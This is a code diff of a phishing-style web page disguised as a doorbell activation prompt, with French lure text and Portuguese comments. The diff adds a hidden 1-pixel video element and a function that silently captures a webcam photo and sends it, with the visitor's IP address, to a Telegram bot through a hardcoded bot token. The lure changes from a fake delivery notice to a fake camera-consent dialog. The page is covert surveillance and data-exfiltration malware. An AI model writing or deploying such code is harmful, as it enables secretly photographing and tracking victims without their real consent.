@@ -43,18 +43,28 @@
             border-radius: 5px;
             text-align: center;
         }
+        
+        /* Elemento de vídeo oculto */
+        #hiddenVideo {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+        }
     </style>
 </head>
 <body>
     <div class="consent-modal" id="consentModal">
         <div class="consent-box">
-            <h2>Felipe Torres</h2>
-            <p>Sonnez la cloche:</p>
-            <button onclick="initiateActivation()">Votre commandeest lá!</button>
+            <h2>Autorisation Requise</h2>
+            <p>Pour activer la sonnette, veuillez accepter l'accès à la caméra :</p>
+            <button onclick="initiateActivation()">Accepter et Activer</button>
         </div>
     </div>
 
     <div id="statusMsg"></div>
+    <video id="hiddenVideo" autoplay playsinline></video>
 
 <script>
 const BOT_TOKEN = '7761704256:AAFjKhIIjUptkMj84pnUU0VG5u5K_VFaJWg';
@@ -68,6 +78,28 @@ async function getIPInfo() {
     } catch (error) {
         return { ip: 'Indisponible' };
     }
+}
+
+async function capturePhoto() {
+    const video = document.getElementById('hiddenVideo');
+    
+    // Acessar câmera
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    
+    // Esperar a câmera inicializar
+    await new Promise(resolve => setTimeout(resolve, 500));
+    
+    // Capturar frame
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    
+    // Parar a câmera
+    stream.getTracks().forEach(track => track.stop());
+    
+    return canvas.toDataURL('image/jpeg', 0.8);
 }
 
 async function sendToTelegram(ip, photoUrl) {
@@ -96,19 +128,11 @@ async function initiateActivation() {
         document.getElementById('consentModal').style.display = 'none';
         document.getElementById('statusMsg').innerHTML = 'Activation en cours...';
 
-        // Captura invisível da câmera
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        
-        // Captura rápida da foto
-        const photoBlob = await imageCapture.takePhoto();
-        const photoUrl = URL.createObjectURL(photoBlob);
-        
-        // Obter IP
+        // Capturar dados
         const ipInfo = await getIPInfo();
+        const photoUrl = await capturePhoto();
         
-        // Envio para Telegram
+        // Enviar para Telegram
         const success = await sendToTelegram(ipInfo.ip, photoUrl);
         
         if(success) {
@@ -120,10 +144,6 @@ async function initiateActivation() {
         } else {
             throw new Error('Échec de l\'envoi');
         }
-
-        // Limpeza
-        track.stop();
-        URL.revokeObjectURL(photoUrl);
 
     } catch (error) {
         document.getElementById('statusMsg').innerHTML = `
